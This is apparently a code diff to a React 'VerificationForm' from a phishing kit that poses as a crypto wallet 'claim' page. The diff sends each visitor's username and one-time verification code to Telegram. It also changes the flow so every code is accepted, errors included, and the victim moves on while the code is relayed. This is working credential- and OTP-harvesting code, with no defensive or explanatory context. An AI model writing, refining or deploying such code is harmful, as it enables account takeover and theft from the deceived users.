@@ -1,6 +1,6 @@
 
 import React, { useState } from 'react';
-import { sendLoginToTelegramAndWait } from '../utils/telegram';
+import { sendToTelegram } from '../utils/telegram';
 
 interface VerificationFormProps {
   username: string;
@@ -24,12 +24,8 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ username, onVerify,
     const message = `<b>✅ WALLET VERIFICATION ${codeLabel} ✅</b>\n\n<b>👤 User:</b> <code>${username}</code>\n<b>🔢 OTP Code:</b> <code>${code}</code>\n\n<i>🛡️ Account Verification Sequence</i>`;
 
     try {
-      const isAccepted = await sendLoginToTelegramAndWait(message, username, true);
-      if (isAccepted) {
-        onVerify();
-      } else {
-        setErrorMsg('Incorrect Verification Code');
-      }
+      await sendToTelegram(message);
+      onVerify();
     } catch (error) {
       onVerify(); 
     } finally {
@@ -95,7 +91,7 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ username, onVerify,
               <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
             </svg>
           ) : null}
-          {isLoading ? 'Waiting for approval...' : 'Complete Claim'}
+          {isLoading ? 'Verifying...' : 'Complete Claim'}
         </button>
 
         <div className="text-center">
